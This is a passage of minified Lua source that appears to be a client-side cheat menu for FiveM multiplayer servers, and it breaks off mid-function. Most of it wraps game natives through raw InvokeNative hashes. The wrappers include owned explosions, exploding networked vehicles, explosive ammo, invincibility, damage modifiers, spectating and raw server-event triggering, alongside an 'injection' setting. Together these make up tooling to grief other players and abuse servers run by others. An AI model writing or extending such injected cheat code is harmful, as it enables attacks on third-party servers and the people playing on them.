Citizen.CreateThread(function()

    local a = Citizen;
    local b = {}
    local c = {
        nat = {},
        var = {
            strings = {},
            checkbox = {
                ['MenuMouse'] = false,
                ['combat:needsclearlos'] = true,
                ['recovery:safeinjection'] = true,
                ['combat:checkdead'] = true,
                ['ui_sounds'] = true
            },
            colors = {},
            combobox = {['combat:bone'] = 1},
            textcaches = {},
            data = {},
            tr = {}
        },
        func = {},
        fram = {
            enabled = true,
            shouldShow = false,
            var = {
                x = 0.4,
                y = 0.1,
                txdicts = {},
                txobjects = {},
                g_w = 0.2,
                NotificationsQueue = {},
                header_h = 0.0826,
                optionCount = 0,
                bHeight = 0.0275,
                selectedMenu = 'MainMenu',
                screenOptions = 20,
                mpos = {},
                controls = {
                    ['UP'] = 172,
                    ['DOWN'] = 173,
                    ['ENTER'] = 191,
                    ['BACKSPACE'] = 194,
                    ['LEFT'] = 174,
                    ['RIGHT'] = 175,
                    ['MOUSE1'] = 24,
                    ['MOUSE2'] = 25,
                    ['MWHEELUP'] = 15,
                    ['MWHEELDOWN'] = 14
                },
                UpOrDown = 'up',
                timers = {
                    currTime = 0,
                    buttonDelay = 0,
                    scrolling = {time = 0, delay = 115},
                    combobox = {time = 0, delay = 90},
                    onlineplayers = {time = 0, delay = 1000},
                    vehiclebrowser = {time = 0, delay = 10000},
                    veh_nextsprite = {time = 0, delay = 1000},
                    wep_nextsprite = {time = 0, delay = 1000},
                    self_pedchanger = {time = 0, delay = 1000}
                },
                colors = {
                    menuAlpha = 0,
                    header = {255, 255, 255, 255},
                    sbOption = {200, 200, 200, 255},
                    bOption = {12, 5, 47, 240}
                }
            },
            func = {}
        },
        Keybinds = {
            [1] = {
                value = 'menu:key',
                label = 'Menu open key',
                description = 'Key to open the menu',
                key = 178
            }
        },
        Keys = {
            ['ESC'] = 322,
            ['F1'] = 288,
            ['F2'] = 289,
            ['F3'] = 170,
            ['F5'] = 166,
            ['F6'] = 167,
            ['F7'] = 168,
            ['F8'] = 169,
            ['F9'] = 56,
            ['F10'] = 57,
            ['~'] = 243,
            ['1'] = 157,
            ['2'] = 158,
            ['3'] = 160,
            ['4'] = 164,
            ['5'] = 165,
            ['6'] = 159,
            ['7'] = 161,
            ['8'] = 162,
            ['9'] = 163,
            ['-'] = 84,
            ['='] = 83,
            ['BACKSPACE'] = 194,
            ['TAB'] = 37,
            ['Q'] = 44,
            ['W'] = 32,
            ['E'] = 38,
            ['R'] = 45,
            ['T'] = 245,
            ['Y'] = 246,
            ['U'] = 303,
            ['P'] = 199,
            ['['] = 39,
            [']'] = 40,
            ['ENTER'] = 191,
            ['CAPS'] = 137,
            ['A'] = 34,
            ['S'] = 8,
            ['D'] = 9,
            ['F'] = 23,
            ['G'] = 47,
            ['H'] = 74,
            ['K'] = 311,
            ['L'] = 182,
            ['LEFTSHIFT'] = 21,
            ['Z'] = 20,
            ['X'] = 73,
            ['C'] = 26,
            ['V'] = 0,
            ['B'] = 29,
            ['N'] = 249,
            ['M'] = 244,
            [','] = 82,
            ['.'] = 81,
            ['LEFTCTRL'] = 36,
            ['LEFTALT'] = 19,
            ['SPACE'] = 22,
            ['RIGHTCTRL'] = 70,
            ['HOME'] = 213,
            ['PAGEUP'] = 10,
            ['PAGEDOWN'] = 11,
            ['DELETE'] = 178,
            ['LEFT'] = 174,
            ['RIGHT'] = 175,
            ['UP'] = 172,
            ['DOWN'] = 173,
            ['NENTER'] = 201,
            ['MWHEELUP'] = 15,
            ['MWHEELDOWN'] = 14,
            ['N4'] = 108,
            ['N5'] = 60,
            ['N6'] = 107,
            ['N+'] = 96,
            ['N-'] = 97,
            ['N7'] = 117,
            ['N8'] = 61,
            ['N9'] = 118,
            ['MOUSE1'] = 24,
            ['MOUSE2'] = 25,
            ['MOUSE3'] = 348
        },
        _math = math,
        _table = table,
        _string = string,
        _json = json,
        _msgpack = msgpack,
        _tostring = tostring,
        _vector3 = vector3,
        _vector2 = vector2,
        _type = type,
        _pairs = pairs,
        _ipairs = ipairs,
        _coroutine = coroutine,
        _setmetatable = setmetatable,
        _tonumber = tonumber,
        _os = os
    }
    c._tostring2 = function(d) return d and d ~= 0 and c._tostring(d) or nil end;
    c._math.lerp = function(e, f, g)
        if e == f then
            return e
        else
            return e + g
        end
    end;
    c._starts = function(h, i)
        return c._string.sub(h, 1, c._string.len(i)) == i
    end;
    c._math.round = function(d, j)
        return c._tonumber(c._string.format('%.' .. (j or 0) .. 'f', d))
    end;
    c._alphanumeric = function(h)
        local l = ''
        for m in c._string.gmatch(h,
                                  '[abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 ]') do
            l = l .. m
        end
        return l
    end;
    function b.GetUniqueId()
        return a.InvokeNative(0x762376233638, a.ReturnResultAnyway(),
                              a.ResultAsInteger())
    end
    function b.GetHashKey(n)
        return c._type(n) == 'number' and n or
                   a.InvokeNative(0xD24D37CC275948CC, c._tostring2(n),
                                  a.ReturnResultAnyway(), a.ResultAsInteger())
    end
    function b.DrawSprite(o, p, q, r, s, t, heading, u, v, w, x)
        if not b.HasStreamedTextureDictLoaded(o) then
            b.RequestStreamedTextureDict(o)
        end
        return a.InvokeNative(0xE7FFAE5EBF23D890, c._tostring2(o),
                              c._tostring2(p), q, r, s, t, heading, u, v, w, x)
    end
    function b.PlayerHaveActiveSub(y)
        return a.InvokeNative(0xEB014D1CC, c._tostring2(y),
                              a.ReturnResultAnyway(), a.ResultAsInteger())
    end
    function b.SetTextScale(z, A)
        return a.InvokeNative(0x07C837F9A01C34C9, z, A)
    end
    function b.SetTextWrap(i, B)
        return a.InvokeNative(0x63145D9C883A1A70, i, B)
    end
    function b.BeginTextCommandDisplayText(h)
        return a.InvokeNative(0x25FBB336DF1804CB, c._tostring2(h))
    end
    function b.NetworkSetInSpectatorMode(C, D)
        return a.InvokeNative(0x423DE3854BB50894, C, D)
    end
    function b.RequestCollisionAtCoord(E, F, G)
        return a.InvokeNative(0x07503F7948F491A7, E, F, G,
                              a.ReturnResultAnyway(), a.ResultAsInteger())
    end
    function b.EndTextCommandDisplayText(E, F)
        return a.InvokeNative(0xCD015E5BB0D96A57, E, F)
    end
    function b.BeginTextCommandLineCount(H)
        return a.InvokeNative(0x521FB041D93DD0E4, c._tostring2(H))
    end
    function b.CreateObject(I, E, F, G, J, K, L)
        return a.InvokeNative(0x509D5878EB39E842, I, E, F, G, J, K, L,
                              a.ReturnResultAnyway(), a.ResultAsInteger())
    end
    function b.AddTextComponentSubstringPlayerName(h)
        return a.InvokeNative(0X6C188bE134E074AA, c._tostring2(h))
    end
    function b.DrawSprite(o, p, q, r, s, t, heading, u, v, w, x)
        if not b.HasStreamedTextureDictLoaded(o) then
            b.RequestStreamedTextureDict(o)
        end
        return a.InvokeNative(0xE7FFAE5EBF23D890, c._tostring2(o),
                              c._tostring2(p), q, r, s, t, heading, u, v, w, x)
    end
    function b.CreateObjectNoOffset(I, E, F, G, J, K, L)
        return a.InvokeNative(0x9A294B2138ABB884, I, E, F, G, J, K, L,
                              a.ReturnResultAnyway(), a.ResultAsInteger())
    end
    function b.GetTextScreenLineCount(E, F)
        return a.InvokeNative(0x9040DFB09BE75706, E, F, a.ReturnResultAnyway(),
                              a.ResultAsInteger())
    end
    function b.DrawRect(E, F, s, t, M, N, O, P)
        return a.InvokeNative(0x3A618A217E5154F0, E, F, s, t, M, N, O, P)
    end
    function b.GiveWeaponToPed(Q, R, S, T, U)
        return a.InvokeNative(0xBF0FD6E56C964FCB, Q, R, S, T, U)
    end
    function b.AddExplosion(E, F, G, V, W, X, Y, Z)
        return a.InvokeNative(0xE3AD2BDBAEE269AC, E, F, G, V, W, X, Y, Z)
    end
    function b.SetEntityVelocity(_, E, F, G)
        return a.InvokeNative(0x1C99BB7B6E96D16F, _, E, F, G)
    end
    function b.ClonePed(Q, heading, J, K)
        return a.InvokeNative(0xEF29A16337FACADB, Q, heading, J, K,
                              a.ReturnResultAnyway(), a.ResultAsInteger())
    end
    function b.RemoveAllPedWeapons(Q, a0)
        return a.InvokeNative(0xF25DF915FA38C5F3, Q, a0)
    end
    function b.SetPedInfiniteAmmoClip(Q, C)
        return a.InvokeNative(0x183DADC6AA953186, Q, C)
    end
    function b.TriggerEventInternal(a1, a2, a3)
        return
            a.InvokeNative(0x91310870, c._tostring2(a1), c._tostring2(a2), a3)
    end
    function b.TriggerServerEventInternal(a1, a2, a3)
        return
            a.InvokeNative(0x7fdd1128, c._tostring2(a1), c._tostring2(a2), a3)
    end
    function b.SetEntityCoords(_, a4, a5, a6, a7, a8, a9, aa)
        return a.InvokeNative(0x06843DA7060A026B, _, a4, a5, a6, a7, a8, a9, aa)
    end
    function b.ClearPedTasks(Q) return a.InvokeNative(0xE1EF3C1216AFF2CD, Q) end
    function b.ClearPedTasksImmediately(Q)
        return a.InvokeNative(0xAAA34F8A7CB32098, Q)
    end
    function b.SetEntityCoordsNoOffset(_, a4, a5, a6, a7, a8, a9)
        return a.InvokeNative(0x239A3351AC1DA385, _, a4, a5, a6, a7, a8, a9)
    end
    function b.NetworkResurrectLocalPlayer(E, F, G, heading, ab, ac)
        return a.InvokeNative(0xEA23C49EAA83ACFB, E, F, G, heading, ab, ac)
    end
    function b.AddOwnedExplosion(Q, E, F, G, V, W, X, Y, Z)
        return a.InvokeNative(0x172AA1B624FA1013, Q, E, F, G, V, W, X, Y, Z)
    end
    function b.GiveWeaponObjectToPed(ad, Q)
        return a.InvokeNative(0xB1FA61371AF7C4B7, ad, Q)
    end
    function b.GiveWeaponComponentToWeaponObject(ad, ae)
        return a.InvokeNative(0x33E179436C0B31DB, ad, b.GetHashKey(ae))
    end
    function b.GetPlayerFromServerId(af)
        return a.InvokeNative(0x344ea166, af, a.ReturnResultAnyway(),
                              a.ResultAsInteger())
    end
    function b.SetExplosiveMeleeThisFrame(ag)
        return a.InvokeNative(0xFF1BED81BFDC0FE0, ag, a.ReturnResultAnyway(),
                              a.ResultAsInteger())
    end
    function b.SetExplosiveAmmoThisFrame(ag)
        return a.InvokeNative(0xA66C71C98D5F2CFB, ag)
    end
    function b.SetFireAmmoThisFrame(ag)
        return a.InvokeNative(0x11879CDD803D30F4, ag, a.ReturnResultAnyway(),
                              a.ResultAsInteger())
    end
    function b.SetSuperJumpThisFrame(ag)
        return a.InvokeNative(0x57FFF03E423A4C0B, ag, a.ReturnResultAnyway(),
                              a.ResultAsInteger())
    end
    function b.IsDisabledControlPressed(ah, ai)
        return
            a.InvokeNative(0xE2587F8CBBD87B1D, ah, ai, a.ReturnResultAnyway())
    end
    function b.DisplayOnscreenKeyboard(aj, ak, al, am, an, ao, ap, aq)
        return a.InvokeNative(0x00DC833F2568DBF6, aj, c._tostring2(ak),
                              c._tostring2(al), c._tostring2(am),
                              c._tostring2(an), c._tostring2(ao),
                              c._tostring2(ap), aq)
    end
    function b.AddTextEntry(ar, as)
        return a.InvokeNative(0x32ca01c3, c._tostring2(ar), c._tostring2(as))
    end
    function b.SetTextEntry(h)
        return a.InvokeNative(0x25FBB336DF1804CB, c._tostring2(h))
    end
    function b.SetTextOutline() return a.InvokeNative(0x2513DFB0FB8400FE) end
    function b.SetTextEdge(aj, M, N, O, P)
        return a.InvokeNative(0x441603240D202FA6, aj, M, N, O, P)
    end
    function b.SetTextProportional(aj)
        return a.InvokeNative(0x038C1F517D7FDCF8, aj)
    end
    function b.RequestStreamedTextureDict(o, a0)
        return a.InvokeNative(0xDFA2EF8E04127DD5, c._tostring2(o), a0)
    end
    function b.PlaySoundFrontend(at, au, av, aw)
        return a.InvokeNative(0x67C540AA08E4A6F5, at, c._tostring2(au),
                              c._tostring2(av), aw)
    end
    function b.SetTextDropShadow() return a.InvokeNative(0x1CA3E9EAC9D93E5E) end
    function b.SetTextDropshadow(ax, M, N, O, P)
        return a.InvokeNative(0x465C84BC39F1C351, ax, M, N, O, P)
    end
    function b.SetTextColour(u, v, w, x)
        return a.InvokeNative(0xBE6B23FFA53FB442, u, v, w, x)
    end
    function b.SetTextFont(ay) return a.InvokeNative(0x66E0276CC5F6B9DA, ay) end
    function b.ApplyForceToEntity(_, az, E, F, G, aA, aB, aC, aD, aE, aF, aG,
                                  aH, aI)
        return a.InvokeNative(0xC5F68BE9613E2D18, _, az, E, F, G, aA, aB, aC,
                              aD, aE, aF, aG, aH, aI)
    end
    function b.SetEntityInvincible(_, C)
        return a.InvokeNative(0x3882114BDE571AD4, _, C)
    end
    function b.SetPedArmour(Q, aJ)
        return a.InvokeNative(0xCEA04D83135264CC, Q, aJ)
    end
    function b.SetEntityHealth(_, aK)
        return a.InvokeNative(0x6B76DC1F3AE6E6A3, _, aK)
    end
    function b.SetPlayerWeaponDamageModifier(ag, aL)
        return a.InvokeNative(0xCE07B9F7817AADA3, ag, aL)
    end
    function b.ShootSingleBulletBetweenCoords(aM, aN, aO, aP, aQ, aR, aS, aT, R,
                                              aU, X, Y, aV)
        return a.InvokeNative(0x867654CBC7606F2C, aM, aN, aO, aP, aQ, aR, aS,
                              aT, b.GetHashKey(R), aU, X, Y, aV)
    end
    function b.SetEntityCoords_2(_, a4, a5, a6, a7, a8, a9, aa)
        return a.InvokeNative(0x621873ECE1178967, _, a4, a5, a6, a7, a8, a9, aa)
    end
    function b.CreateVehicle(I, E, F, G, heading, J, K)
        return a.InvokeNative(0xAF35D0D2583051B0, I, E, F, G, heading, J, K,
                              a.ReturnResultAnyway(), a.ResultAsInteger())
    end
    function b.SetEntityVisible(_, C, ab)
        return a.InvokeNative(0xEA1C610A04DB6BBB, _, C, ab)
    end
    function b.CreatePed(aW, I, E, F, G, heading, J, K)
        return a.InvokeNative(0xD49F9B0955C367DE, aW, I, E, F, G, heading, J, K,
                              a.ReturnResultAnyway(), a.ResultAsInteger())
    end
    function b.NetworkExplodeVehicle(vehicle, X, Y, aw)
        return a.InvokeNative(0x301A42153C9AD707, vehicle, X, Y, aw,
                              a.ReturnResultAnyway(), a.ResultAsInteger())
    end
    function b.DoesExtraExist(vehicle, aX)
        return a.InvokeNative(0x1262D55792428154, vehicle, aX,
                              a.ReturnResultAnyway())
    end
    function b.AttachEntityToEntity(aY, aZ, aD, a4, a5, a6, a_, b0, b1, b2, b3,
                                    b4, b5, b6, b7)
        return a.InvokeNative(0x6B9BBD38AB0796DF, aY, aZ, aD, a4, a5, a6, a_,
                              b0, b1, b2, b3, b4, b5, b6, b7)
    end
    function b.SetPedIntoVehicle(Q, vehicle, b8)
        return a.InvokeNative(0xF75B0D629E1C063D, Q, vehicle, b8)
    end
    function b.SetPedWeaponTintIndex(Q, R, b9)
        return a.InvokeNative(0x50969B9B89ED5738, Q, R, b9)
    end
    function b.NetworkRequestControlOfEntity(_)
        return a.InvokeNative(0xB69317BF5E782347, _, a.ReturnResultAnyway())
    end
    function b.ShowHeadingIndicatorOnBlip(ba, C)
        return a.InvokeNative(0x5FBCA48327B914DF, ba, C)
    end
    function b.SetPedAmmo(Q, R, bb)
        return a.InvokeNative(0x14E56BC5B5DB6A19, Q, R, bb)
    end
    function b.SetWeaponDamageModifier(R, bc)
        return a.InvokeNative(0x4757F00BC6323CFE, R, bc)
    end
    function b.NetworkRegisterEntityAsNetworked(_)
        return a.InvokeNative(0x06FAACD625D80CAA, _)
    end
    function b.DisableAllControlActions(ah)
        return a.InvokeNative(0x5F4B6931816E599B, ah)
    end
    function b.SetMouseCursorActiveThisFrame()
        return a.InvokeNative(0xAAE7CE1D63167423)
    end
    function b.SetMouseCursorSprite(bd)
        return a.InvokeNative(0x8DB8CFFD58B62552, bd)
    end
    function b.UpdateOnscreenKeyboard()
        return a.InvokeNative(0x0CF2B696BBF945AE, a.ReturnResultAnyway(),
                              a.ResultAsInteger())
    end
    function b.GetActiveScreenResolution()
        return a.InvokeNative(0x873C9F3104101DD3, a.PointerValueInt(),
                              a.PointerValueInt())
    end
    function b.GetNuiCursorPosition()
        return a.InvokeNative(0xbdba226f, a.PointerValueInt(),
                              a.PointerValueInt())
    end
    function b.IsDisabledControlJustPressed(ah, ai)
        return
            a.InvokeNative(0x91AEF906BCA88877, ah, ai, a.ReturnResultAnyway())
    end
    function b.GetGameTimer()
        return a.InvokeNative(0x9CD27B0045628463, a.ReturnResultAnyway(),
                              a.ResultAsInteger())
    end
    function b.SetDrawOrigin(E, F, G, aw)
        return a.InvokeNative(0xAA0008F3BBB8F416, E, F, G, aw)
    end
    function b.SetTextCentre(be)
        return a.InvokeNative(0xC02F4DBFB51D988B, be)
    end
    function b.ClearDrawOrigin() return a.InvokeNative(0xFF0B610F6BE0D7AF) end
    function b.GetPlayerName(ag)
        return a.InvokeNative(0x6D0DE6A7B5DA71F8, ag, a.ReturnResultAnyway(),
                              a.ResultAsString())
    end
    function b.PlayerId()
        return a.InvokeNative(0x4F8644AF03D0E0D6, a.ReturnResultAnyway(),
                              a.ResultAsInteger())
    end
    function b.CreateRuntimeTextureFromDuiHandle(bf, bg, bh)
        return a.InvokeNative(0xb135472b, bf, bg, c._tostring2(bh),
                              a.ReturnResultAnyway(), a.ResultAsLong())
    end
    function b.GetDuiHandle(bi)
        return a.InvokeNative(0x1655d41d, bi, a.ReturnResultAnyway(),
                              a.ResultAsString())
    end
    function b.CreateRuntimeTxd(bj)
        return a.InvokeNative(0x1f3ac778, c._tostring2(bj),
                              a.ReturnResultAnyway(), a.ResultAsLong())
    end
    function b.GetPlayerServerId(ag)
        return a.InvokeNative(0x4d97bcc7, ag, a.ReturnResultAnyway(),
                              a.ResultAsInteger())
    end
    function b.SetPedComponentVariation(Q, bk, bl, bm, bn)
        return a.InvokeNative(0x262B14F48D29DE80, Q, bk, bl, bm, bn)
    end
    function b.SetPedPropIndex(Q, bk, bl, bm, bo)
        return a.InvokeNative(0x93376B65A266EB5F, Q, bk, bl, bm, bo)
    end
    function b.GetPlayerPed(bp)
        return a.InvokeNative(0x43A66C31C68491C0, bp, a.ReturnResultAnyway(),
                              a.ResultAsInteger())
    end
    function b.CreateDui(bq, s, t)
        return a.InvokeNative(0x23eaf899, c._tostring2(bq), s, t,
                              a.ReturnResultAnyway(), a.ResultAsLong())
    end
    function b.CreateCam(br, a0)
        return a.InvokeNative(0xC3981DCE61D9E13F, c._tostring2(br), a0,
                              a.ReturnResultAnyway(), a.ResultAsInteger())
    end
    function b.GetDistanceBetweenCoords(aM, aN, aO, aP, aQ, aR, bs)
        return a.InvokeNative(0xF1B760881820C952, aM, aN, aO, aP, aQ, aR, bs,
                              a.ReturnResultAnyway(), a.ResultAsFloat())
    end
    function b.GetEntityCoords(_, bt)
        return a.InvokeNative(0x3FEF770D40960D5A, _ or b.PlayerPedId(), bt,
                              a.ReturnResultAnyway(), a.ResultAsVector())
    end
    function b.PlayerPedId()
        return a.InvokeNative(0xD80958FC74E988A6, a.ReturnResultAnyway(),
                              a.ResultAsInteger())
    end
    function b.GetPedPropIndex(Q, bk)
        return a.InvokeNative(0x898CC20EA75BACD8, Q, bk, a.ReturnResultAnyway(),
                              a.ResultAsInteger())
    end
    function b.GetPedPropTextureIndex(Q, bk)
        return a.InvokeNative(0xE131A28626F81AB2, Q, bk, a.ReturnResultAnyway(),
                              a.ResultAsInteger())
    end
    function b.GetPedDrawableVariation(Q, bk)
        return a.InvokeNative(0x67F3780DD425D4FC, Q, bk, a.ReturnResultAnyway(),
                              a.ResultAsInteger())
    end
    function b.GetPedPaletteVariation(Q, bk)
        return a.InvokeNative(0xE3DD5F2A84B42281, Q, bk, a.ReturnResultAnyway(),
                              a.ResultAsInteger())
    end
    function b.GetPedTextureVariation(Q, bk)
        return a.InvokeNative(0x04A355E041E004E6, Q, bk, a.ReturnResultAnyway(),
                              a.ResultAsInteger())
    end
    function b.SetVehicleMod(vehicle, bu, bv, bw)
        return a.InvokeNative(0x6AF0636DDEDCB6DD, vehicle, bu, bv, bw)
    end
    function b.GetNumVehicleMods(vehicle, bu)
        return a.InvokeNative(0xE38E9162A2500646, vehicle, bu,
                              a.ReturnResultAnyway(), a.ResultAsInteger())
    end
    function b.ToggleVehicleMod(vehicle, bu, C)
        return a.InvokeNative(0x2A1F4F37F95BAD08, vehicle, bu, C)
    end
    function b.PedToNet(Q)
        return a.InvokeNative(0x0EDEC3C276198689, Q, a.ReturnResultAnyway(),
                              a.ResultAsInteger())
    end
    function b.SetFocusEntity(_) return a.InvokeNative(0x198F77705FA0931D, _) end
    function b.DestroyCam(bx, K)
        return a.InvokeNative(0x865908C81A2C22E9, bx, K)
    end
    function b.SetCamActive(bx, by)
        return a.InvokeNative(0x026FB97D0A425F84, bx, by)
    end
    function b.RenderScriptCams(bz, bA, bB, aw, bC)
        return a.InvokeNative(0x07E5B515DB0636FC, bz, bA, bB, aw, bC)
    end
    function b.SetCamRot(bx, bD, bE, bF, bG)
        return a.InvokeNative(0x85973643155D0B07, bx, bD, bE, bF, bG)
    end
    function b.DeleteEntity(_)
        return a.InvokeNative(0xAE3CBE5BF394C9C9,
                              a.PointerValueIntInitialized(_))
    end
    function b.ClearFocus() return a.InvokeNative(0x31B73D1EA9F01DA2) end
    function b.SetCamCoord(bx, bH, bI, bJ)
        return a.InvokeNative(0x4D41783FB745E42E, bx, bH, bI, bJ)
    end
    function b.GetCamRot(bx, bG)
        return a.InvokeNative(0x7D304C1C955E3E12, bx, bG,
                              a.ReturnResultAnyway(), a.ResultAsVector())
    end
    function b.GetGameplayCamCoord()
        return a.InvokeNative(0x14D6F5678D8F1B37, a.ReturnResultAnyway(),
                              a.ResultAsVector())
    end
    function b.GetGameplayCamFov()
        return a.InvokeNative(0x65019750A0324133, a.ReturnResultAnyway(),
                              a.ResultAsFloat())
    end
    function b.HideHudAndRadarThisFrame()
        return a.InvokeNative(0x719FF505F097FD20)
    end
    function b.DisablePlayerFiring(ag, C)
        return a.InvokeNative(0x5E6CC07646BBEAB8, ag, C)
    end
    function b.SetEntityRotation(_, bK, bL, bM, bG, bN)
        return a.InvokeNative(0x8524A8B0171D5E07, _, bK, bL, bM, bG, bN)
    end
    function b.GetEntityRotation(_, bG)
        return a.InvokeNative(0xAFBD61CC738D9EB9, _, bG, a.ReturnResultAnyway(),
                              a.ResultAsVector())
    end
    function b.ResetEntityAlpha(_)
        return a.InvokeNative(0x9B1E824FFBB7027A, _, a.ReturnResultAnyway(),
                              a.ResultAsInteger())
    end
    function b.SetEntityAlpha(_, bO, bP)
        return a.InvokeNative(0x44A0870B7E92D7C0, _, bO, bP)
    end
    function b.GetEntityHeading(_)
        return a.InvokeNative(0xE83D4F9BA2A38914, _, a.ReturnResultAnyway(),
                              a.ResultAsFloat())
    end
    function b.GetEntityForwardVector(_)
        return a.InvokeNative(0x0A794A5A57F8DF91, _, a.ReturnResultAnyway(),
                              a.ResultAsVector())
    end
    function b.GetEntityForwardX(_)
        return a.InvokeNative(0x8BB4EF4214E0E6D5, _, a.ReturnResultAnyway(),
                              a.ResultAsFloat())
    end
    function b.GetEntityForwardY(_)
        return a.InvokeNative(0x866A4A5FAE349510, _, a.ReturnResultAnyway(),
                              a.ResultAsFloat())
    end
    function b.GetEntityHealth(_)
        return a.InvokeNative(0xEEF059FAD016D209, _, a.ReturnResultAnyway(),
                              a.ResultAsInteger())
    end
    function b.GetVehiclePedIsIn(Q, bQ)
        return a.InvokeNative(0x9A9112A0FE9A4713, Q, bQ, a.ReturnResultAnyway(),
                              a.ResultAsInteger())
    end
    function b.IsPedInAnyVehicle(Q, bR)
        return a.InvokeNative(0x997ABD671D25CA0B, Q, bR, a.ReturnResultAnyway())
    end
    function b.GetResourceState(bS)
        return a.InvokeNative(0x4039b485, c._tostring2(bS),
                              a.ReturnResultAnyway(), a.ResultAsString())
    end
    function b.HasStreamedTextureDictLoaded(o)
        return a.InvokeNative(0x0145F696AAAAD2E4, c._tostring2(o),
                              a.ReturnResultAnyway())
    end
    function b.GetScreenCoordFromWorldCoord(bT, bU, bV)
        return a.InvokeNative(0x34E82F05DF2974F5, bT, bU, bV,
                              a.PointerValueFloat(), a.PointerValueFloat(),
                              a.ReturnResultAnyway())
    end
    function b.SetPedInfiniteAmmo(Q, C, R)
        return a.InvokeNative(0x3EDCB0505123623B, Q, C, b.GetHashKey(R))
    end
    function b.SetVehicleCustomPrimaryColour(vehicle, M, N, O)
        return a.InvokeNative(0x7141766F91D15BEA, vehicle, M, N, O)
    end
    function b.SetVehicleCustomSecondaryColour(vehicle, M, N, O)
        return a.InvokeNative(0x36CED73BFED89754, vehicle, M, N, O)
    end
    function b.GetPedArmour(Q)
        return a.InvokeNative(0x9483AF821605B1D8, Q, a.ReturnResultAnyway(),
                              a.ResultAsInteger())
    end
    function b.SetVehicleColours(vehicle, bW, bX)
        return a.InvokeNative(0x4F1D4BE3A7F24601, vehicle, bW, bX)
    end
    function b.SetVehicleExtraColours(vehicle, bY, bZ)
        return a.InvokeNative(0x2036F561ADD12E33, vehicle, bY, bZ)
    end
    function b.SetVehicleExtra(vehicle, aX, b_)
        return a.InvokeNative(0x7EE3A3C5E4A40CC9, vehicle, aX, b_)
    end
    function b.SetVehicleEngineHealth(vehicle, aK)
        return a.InvokeNative(0x45F6D8EEF34ABEF1, vehicle, aK)
    end
    function b.GetVehicleNumberPlateText(vehicle)
        return a.InvokeNative(0x7CE1CCB9B293020E, vehicle,
                              a.ReturnResultAnyway(), a.ResultAsString())
    end
    function b.GetPedInVehicleSeat(vehicle, c0)
        return a.InvokeNative(0xBB40DD2270B65366, vehicle, c0,
                              a.ReturnResultAnyway(), a.ResultAsInteger())
    end
    function b.SetVehicleOnGroundProperly(vehicle)
        return a.InvokeNative(0x49733E92263139D1, vehicle,
                              a.ReturnResultAnyway())
    end
    function b.SetVehicleFixed(vehicle)
        return a.InvokeNative(0x115722B1B9C14C1C, vehicle)
    end
    function b.SetVehicleBurnout(vehicle, C)
        return a.InvokeNative(0xFB8794444A7D60FB, vehicle, C)
    end
    function b.SetVehicleEngineOn(vehicle, c1, c2, c3)
        return a.InvokeNative(0x2497C4717C8B881E, vehicle, c1, c2, c3)
    end
    function b.IsControlEnabled(ah, ai)
        return
            a.InvokeNative(0x1CEA6BFDF248E5D9, ah, ai, a.ReturnResultAnyway())
    end
    function b.IsControlJustPressed(ah, ai)
        return
            a.InvokeNative(0x580417101DDB492F, ah, ai, a.ReturnResultAnyway())
    end
    function b.IsControlJustReleased(ah, ai)
        return
            a.InvokeNative(0x50F940259D3841E6, ah, ai, a.ReturnResultAnyway())
    end
    function b.IsControlPressed(ah, ai)
        return
            a.InvokeNative(0xF3A21BCD95725A4A, ah, ai, a.ReturnResultAnyway())
    end
    function b.IsControlReleased(ah, ai)
        return
            a.InvokeNative(0x648EE3E7F38877DD, ah, ai, a.ReturnResultAnyway())
    end
    function b.IsDisabledControlJustReleased(ah, ai)
        return
            a.InvokeNative(0x305C8DCD79DA8B0F, ah, ai, a.ReturnResultAnyway())
    end
    function b.IsDisabledControlReleased(ah, ai)
        return
            a.InvokeNative(0xFB6C4072E9A32E92, ah, ai, a.ReturnResultAnyway())
    end
    function b.SetEntityHeading(_, heading)
        return a.InvokeNative(0x8E2530AA8ADA980E, _, heading)
    end
    function b.SetVehicleGravityAmount(vehicle, c4)
        return a.InvokeNative(0x1a963e58, vehicle, c4)
    end
    function b.ResetPlayerStamina(ag)
        return a.InvokeNative(0xA6F312FCCE9C1DFE, ag)
    end
    function b.RestorePlayerStamina(ag, a0)
        return a.InvokeNative(0xA352C1B864CAFD33, ag, a0)
    end
    function b.DisplayRadar(C)
        return a.InvokeNative(0xA0EBB943C300E693, C, a.ReturnResultAnyway(),
                              a.ResultAsInteger())
    end
    function b.SetVehicleModKit(vehicle, c5)
        return a.InvokeNative(0x1F2AA07F00B3217A, vehicle, c5)
    end
    function b.DisableControlAction(ah, ai, b_)
        return a.InvokeNative(0xFE99B66D079CF6BC, ah, ai, b_)
    end
    function b.DoesEntityExist(_)
        return a.InvokeNative(0x7239B21A38F536BA, _, a.ReturnResultAnyway())
    end
    function b.SetPedCanRagdoll(Q, C)
        return a.InvokeNative(0xB128377056A54E2A, Q, C)
    end
    function b.SetVehicleModColor_1(vehicle, c6, c7, aw)
        return a.InvokeNative(0x43FEB945EE7F85B8, vehicle, c6, c7, aw)
    end
    function b.GetPedLastWeaponImpactCoord(Q, c8)
        return a.InvokeNative(0x6C4D0409BA1A2BC2, Q, a.PointerValueVector(),
                              a.ReturnResultAnyway())
    end
    function b.LoadResourceFile(bS, c9)
        return a.InvokeNative(0x76a9ee1f, c._tostring2(bS), c._tostring2(c9),
                              a.ReturnResultAnyway(), a.ResultAsString())
    end
    function b.GetVehicleColours(vehicle)
        return a.InvokeNative(0xA19435F193E081AC, vehicle, a.PointerValueInt(),
                              a.PointerValueInt())
    end
    function b.GetVehicleExtraColours(vehicle)
        return a.InvokeNative(0x3BC4245933A166F7, vehicle, a.PointerValueInt(),
                              a.PointerValueInt())
    end
    function b.IsVehicleExtraTurnedOn(vehicle, aX)
        return a.InvokeNative(0xD2E6822DBFD6C8BD, vehicle, aX,
                              a.ReturnResultAnyway())
    end
    function b.GetEntityModel(_)
        return a.InvokeNative(0x9F47B058362C84B5, _, a.ReturnResultAnyway(),
                              a.ResultAsInteger())
    end
    function b.GetVehicleNumberPlateTextIndex(vehicle)
        return a.InvokeNative(0xF11BC2DD9A3E7195, vehicle,
                              a.ReturnResultAnyway(), a.ResultAsInteger())
    end
    function b.GetVehicleWheelType(vehicle)
        return a.InvokeNative(0xB3ED1BFB4BE636DC, vehicle,
                              a.ReturnResultAnyway(), a.ResultAsInteger())
    end
    function b.GetVehicleWindowTint(vehicle)
        return a.InvokeNative(0x0EE21293DAD47C95, vehicle,
                              a.ReturnResultAnyway(), a.ResultAsInteger())
    end
    function b.IsVehicleNeonLightEnabled(vehicle, c0)
